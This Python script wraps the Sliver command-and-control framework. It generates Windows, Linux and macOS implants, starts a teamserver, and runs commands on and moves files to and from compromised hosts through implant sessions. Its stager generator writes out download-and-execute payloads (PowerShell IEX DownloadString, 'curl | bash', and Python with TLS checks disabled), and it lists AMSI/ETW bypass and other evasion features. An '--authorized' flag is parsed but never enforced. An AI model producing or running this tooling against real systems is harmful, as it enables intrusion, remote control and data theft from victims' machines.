#!/usr/bin/env python3
"""
Sliver C2 Framework Integration
Advanced cross-platform C2 framework used by nation-state actors
Go-based, supports mTLS, WireGuard, HTTP(S), DNS channels
"""

import subprocess
import json
import os
import logging
from pathlib import Path
from typing import Dict, List, Optional

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SliverC2Framework:
    """
    Production-ready Sliver C2 Framework integration
    Cross-platform implants with advanced evasion capabilities
    """
    
    def __init__(self, server_host: str = "127.0.0.1", server_port: int = 31337):
        self.server_host = server_host
        self.server_port = server_port
        self.sliver_path = self._find_sliver()
        
    def _find_sliver(self) -> Optional[str]:
        """Locate Sliver binary"""
        possible_paths = [
            "/usr/local/bin/sliver-client",
            "/usr/bin/sliver-client",
            str(Path.home() / ".sliver" / "sliver-client"),
            "sliver-client"
        ]
        
        for path in possible_paths:
            if os.path.exists(path) or subprocess.run(["which", path], 
                                                     capture_output=True).returncode == 0:
                return path
        return None
    
    def check_installation(self) -> Dict[str, any]:
        """Check if Sliver is installed"""
        result = {
            "installed": False,
            "version": None,
            "path": None,
            "install_command": "curl https://sliver.sh/install | sudo bash"
        }
        
        if self.sliver_path:
            try:
                version_output = subprocess.check_output(
                    [self.sliver_path, "version"],
                    stderr=subprocess.STDOUT,
                    timeout=5
                ).decode()
                result["installed"] = True
                result["version"] = version_output.strip()
                result["path"] = self.sliver_path
            except Exception as e:
                logger.warning(f"Sliver found but version check failed: {e}")
        
        return result
    
    def generate_implant(self, os_type: str = "windows", arch: str = "amd64",
                        c2_url: str = None, output_format: str = "exe",
                        output_path: str = "./implant") -> Dict[str, any]:
        """
        Generate Sliver implant/beacon
        
        Args:
            os_type: Target OS (windows, linux, macos)
            arch: Architecture (amd64, 386, arm64)
            c2_url: C2 callback URL (e.g., https://c2.example.com)
            output_format: exe, dll, shellcode, service
            output_path: Where to save the implant
        """
        if not self.sliver_path:
            return {"error": "Sliver not installed", "install_cmd": "curl https://sliver.sh/install | sudo bash"}
        
        cmd = [
            self.sliver_path,
            "generate",
            f"--os={os_type}",
            f"--arch={arch}",
            f"--format={output_format}",
            f"--save={output_path}"
        ]
        
        if c2_url:
            cmd.extend([f"--http={c2_url}"])
        
        try:
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30).decode()
            return {
                "success": True,
                "os": os_type,
                "arch": arch,
                "format": output_format,
                "output": output_path,
                "details": output
            }
        except subprocess.CalledProcessError as e:
            return {"error": f"Generation failed: {e.output.decode()}", "command": " ".join(cmd)}
        except Exception as e:
            return {"error": str(e)}
    
    def start_server(self, listen_host: str = "0.0.0.0", listen_port: int = 31337,
                    persistent: bool = True) -> Dict[str, any]:
        """
        Start Sliver teamserver (daemon mode)
        
        Args:
            listen_host: IP to bind
            listen_port: Port to bind
            persistent: Run as daemon
        """
        if not self.sliver_path:
            return {"error": "Sliver not installed"}
        
        cmd = [
            "sliver-server",
            "daemon",
            "-l", listen_host,
            "-p", str(listen_port)
        ]
        
        if persistent:
            cmd.append("--persistent")
        
        try:
            logger.info(f"Starting Sliver server on {listen_host}:{listen_port}")
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            return {
                "success": True,
                "pid": process.pid,
                "listen": f"{listen_host}:{listen_port}",
                "message": "Sliver teamserver started in daemon mode"
            }
        except Exception as e:
            return {"error": str(e)}
    
    def list_sessions(self) -> List[Dict[str, any]]:
        """List active implant sessions"""
        if not self.sliver_path:
            return [{"error": "Sliver not installed"}]
        
        try:
            cmd = [self.sliver_path, "sessions", "-j"]
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=10).decode()
            sessions = json.loads(output) if output.strip() else []
            return sessions
        except subprocess.CalledProcessError:
            return []
        except Exception as e:
            logger.error(f"Failed to list sessions: {e}")
            return []
    
    def execute_command(self, session_id: str, command: str) -> Dict[str, any]:
        """Execute command on compromised system via implant"""
        if not self.sliver_path:
            return {"error": "Sliver not installed"}
        
        try:
            cmd = [self.sliver_path, "use", session_id, "--exec", command]
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=30).decode()
            return {
                "success": True,
                "session_id": session_id,
                "command": command,
                "output": output
            }
        except Exception as e:
            return {"error": str(e)}
    
    def upload_file(self, session_id: str, local_path: str, remote_path: str) -> Dict[str, any]:
        """Upload file to compromised system"""
        cmd = [self.sliver_path, "use", session_id, "--upload", local_path, remote_path]
        try:
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=60).decode()
            return {"success": True, "local": local_path, "remote": remote_path, "output": output}
        except Exception as e:
            return {"error": str(e)}
    
    def download_file(self, session_id: str, remote_path: str, local_path: str) -> Dict[str, any]:
        """Download file from compromised system"""
        cmd = [self.sliver_path, "use", session_id, "--download", remote_path, local_path]
        try:
            output = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=60).decode()
            return {"success": True, "remote": remote_path, "local": local_path, "output": output}
        except Exception as e:
            return {"error": str(e)}
    
    def generate_stager(self, listener_url: str, output_format: str = "powershell") -> Dict[str, any]:
        """
        Generate stage 1 stager for initial access
        
        Args:
            listener_url: C2 listener URL
            output_format: powershell, bash, python
        """
        stagers = {
            "powershell": f"""
$url = "{listener_url}"
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0")
IEX($wc.DownloadString($url))
""",
            "bash": f"""
#!/bin/bash
curl -k -s {listener_url} | bash
""",
            "python": f"""
import urllib.request
import ssl
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
urllib.request.urlopen('{listener_url}', context=ctx).read()
"""
        }
        
        return {
            "format": output_format,
            "stager": stagers.get(output_format, "Format not supported"),
            "listener": listener_url
        }
    
    def get_info(self) -> Dict[str, any]:
        """Get Sliver installation and capability info"""
        info = self.check_installation()
        info.update({
            "name": "Sliver C2 Framework",
            "description": "Advanced cross-platform C2 framework",
            "features": [
                "Cross-platform implants (Windows, macOS, Linux)",
                "mTLS, WireGuard, HTTP(S), DNS C2 channels",
                "Dynamic code generation",
                "In-memory execution",
                "Process injection",
                "Metasploit integration",
                "Per-instance TLS certificates"
            ],
            "supported_formats": ["exe", "dll", "shellcode", "service"],
            "supported_os": ["windows", "linux", "macos"],
            "architectures": ["amd64", "386", "arm64"],
            "evasion": [
                "Dynamic TLS certs per implant",
                "Sleep obfuscation",
                "AMSI/ETW bypass capabilities",
                "In-memory shellcode execution"
            ]
        })
        return info


def main():
    """CLI interface for Sliver C2 Framework"""
    import argparse
    
    parser = argparse.ArgumentParser(description="Sliver C2 Framework Integration")
    parser.add_argument("--check", action="store_true", help="Check installation status")
    parser.add_argument("--install", action="store_true", help="Show installation instructions")
    parser.add_argument("--generate", action="store_true", help="Generate implant")
    parser.add_argument("--os", default="windows", choices=["windows", "linux", "macos"], 
                       help="Target OS")
    parser.add_argument("--arch", default="amd64", choices=["amd64", "386", "arm64"],
                       help="Architecture")
    parser.add_argument("--format", default="exe", choices=["exe", "dll", "shellcode", "service"],
                       help="Output format")
    parser.add_argument("--c2-url", help="C2 callback URL (e.g., https://c2.example.com)")
    parser.add_argument("--output", default="./implant", help="Output path for implant")
    parser.add_argument("--stager", help="Generate stager for listener URL")
    parser.add_argument("--stager-format", default="powershell", 
                       choices=["powershell", "bash", "python"], help="Stager format")
    parser.add_argument("--sessions", action="store_true", help="List active sessions")
    parser.add_argument("--info", action="store_true", help="Show Sliver capabilities")
    parser.add_argument('--authorized', action='store_true',
                       help='Confirm you have authorization to perform this action')
    args = parser.parse_args()
    
    sliver = SliverC2Framework()
    
    if args.check or args.install:
        status = sliver.check_installation()
        print("\n═══ Sliver C2 Installation Status ═══")
        print(f"Installed: {status['installed']}")
        if status['installed']:
            print(f"Version: {status['version']}")
            print(f"Path: {status['path']}")
        else:
            print(f"\n📥 Install Command:")
            print(f"   {status['install_command']}")
            print(f"\nOr manually:")
            print(f"   wget https://github.com/BishopFox/sliver/releases/latest/download/sliver-client_linux")
            print(f"   chmod +x sliver-client_linux")
            print(f"   sudo mv sliver-client_linux /usr/local/bin/sliver-client")
    
    elif args.info:
        info = sliver.get_info()
        print("\n═══ Sliver C2 Framework Info ═══")
        print(f"Name: {info['name']}")
        print(f"Description: {info['description']}")
        print(f"\n🎯 Features:")
        for feature in info['features']:
            print(f"   • {feature}")
        print(f"\n🛡️ Evasion Capabilities:")
        for evasion in info['evasion']:
            print(f"   • {evasion}")
        print(f"\n💻 Supported Platforms:")
        print(f"   OS: {', '.join(info['supported_os'])}")
        print(f"   Architectures: {', '.join(info['architectures'])}")
        print(f"   Formats: {', '.join(info['supported_formats'])}")
    
    elif args.generate:
        print(f"\n🔨 Generating Sliver implant...")
        result = sliver.generate_implant(
            os_type=args.os,
            arch=args.arch,
            c2_url=args.c2_url,
            output_format=args.format,
            output_path=args.output
        )
        
        if "success" in result:
            print(f"✅ Implant generated successfully!")
            print(f"   OS: {result['os']}")
            print(f"   Architecture: {result['arch']}")
            print(f"   Format: {result['format']}")
            print(f"   Output: {result['output']}")
        else:
            print(f"❌ Error: {result.get('error', 'Unknown error')}")
    
    elif args.stager:
        result = sliver.generate_stager(args.stager, args.stager_format)
        print(f"\n🚀 Sliver Stager ({result['format']}):")
        print(f"{'='*60}")
        print(result['stager'])
        print(f"{'='*60}")
    
    elif args.sessions:
        sessions = sliver.list_sessions()
        print(f"\n📡 Active Sliver Sessions: {len(sessions)}")
        for session in sessions:
            print(f"   ID: {session.get('id', 'N/A')}")
            print(f"   Host: {session.get('hostname', 'N/A')}")
            print(f"   User: {session.get('username', 'N/A')}")
            print(f"   OS: {session.get('os', 'N/A')}")
            print()
    
    else:
        parser.print_help()


if __name__ == "__main__":
    main()
